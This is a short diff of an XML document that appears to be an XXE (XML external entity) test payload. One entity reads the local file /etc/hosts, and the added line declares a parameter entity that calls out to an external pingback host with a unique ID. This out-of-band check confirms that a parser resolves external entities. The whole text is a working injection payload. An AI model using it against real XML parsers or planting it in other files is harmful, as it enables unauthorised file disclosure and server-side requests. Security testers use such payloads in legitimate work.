@@ -1,5 +1,6 @@
 <?xml version="1.0"?>
 <!DOCTYPE roottag [
+<!ENTITY % param SYSTEM "http://pingb.in/4cd02dfed1c894c72e0752a5a99a">
 <!ENTITY % para "<!ENTITY http SYSTEM 'file:///etc/hosts'>">
 %para; ]>
 <root>
